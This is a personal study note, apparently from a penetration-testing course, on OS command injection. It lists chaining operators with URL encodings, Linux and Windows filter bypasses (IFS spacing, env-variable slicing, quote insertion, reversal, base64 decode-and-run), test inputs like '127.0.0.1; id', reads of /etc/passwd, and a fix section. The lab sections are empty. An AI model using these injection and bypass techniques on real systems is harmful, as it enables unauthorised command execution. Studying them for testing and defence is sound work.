# Command Injections

> Status: 🟨 In progress
> Date started: 2026-10-26
> Date finished: 

## 1. Goal
Inject OS commands where an app passes user input into a system call. Find an input that reaches a shell, chain a command with an operator, bypass filters as needed.

## Injection operators (chain your command)
| Operator | URL-enc | Effect |
|---|---|---|
| `;` | %3b | run both (Linux; also cmd) |
| `\n` | %0a | run both |
| `&` | %26 | run both (background) |
| `\|` | %7c | pipe; shows 2nd output |
| `&&` | %26%26 | run 2nd if 1st succeeds |
| `\|\|` | %7c%7c | run 2nd if 1st fails |
| `` `cmd` `` / `$(cmd)` | %60 / %24%28%29 | sub-shell (Linux) |

Test with a benign cmd: `127.0.0.1; id` or `127.0.0.1 && whoami`.

## Filter bypasses — Linux
```bash
# spaces blocked:
cat${IFS}/etc/passwd      # ${IFS}
{cat,/etc/passwd}         # brace-comma
cat%09/etc/passwd         # tab
# slash/semicolon from env:
${PATH:0:1}               # -> /
${LS_COLORS:10:1}         # -> ;
# blacklisted chars: insert quotes (even number) or \ / $@
w'h'o'am'i  ;  who$@ami
# case:  $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
# reversed:  eval $(rev<<<'imaohw')
# base64:  bash<<<$(base64 -d<<<Y2F0...)
```

## Filter bypasses — Windows
```powershell
# spaces:  cmd  %PROGRAMFILES:~10,-5%   |  PS  $env:PROGRAMFILES[10]
# chars from env:  %HOMEPATH:~0,-17%  (-> \)  |  $env:HOMEPATH[0]
# insert: ' or " (even count) ; ^ escape char (cmd)
# case:  WhoAmi  (odd case beats naive blacklists)
# reversed (PS):  iex "$('imaohw'[-1..-20] -join '')"
# base64 (PS, UTF-16LE):
#   [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('whoami'))
#   iex "$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('<b64>')))"
```

## Approach & fix
1. Find input reaching a command (filenames, ping/host fields, converters).
2. Inject an operator + benign cmd (`id`/`whoami`) to confirm.
3. Hit a filter → bypass spaces, then blacklisted chars, then whole-command (case/reverse/base64).
4. Escalate to a shell once confirmed (payload not stored here).

**Fix:** never pass user input to a shell; use language APIs/parameterized calls; strict allow-list input validation; least privilege.

> Workflow: confirm with `id` first, then escalate filter bypasses in order (spaces → chars → encoding). Base64-piping-to-bash defeats most naive filters in one shot.

## My notes / lab output
Filled in as I run these on lab targets.

## 2. Setup
- Attack box: (Pwnbox / Kali VM)
- Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)

## 3. Commands I used
Each block says which machine it ran on.

```bash
# [ATTACK BOX]

```

```bash
# [TARGET]

```

## 4. Confirmed (what worked)
- 

## 5. Tried, didn't work (and why)
- 

## 6. Open questions / revisit
- 

## 7. Cheat sheet lines
Copied into `cheatsheets/`:
- 
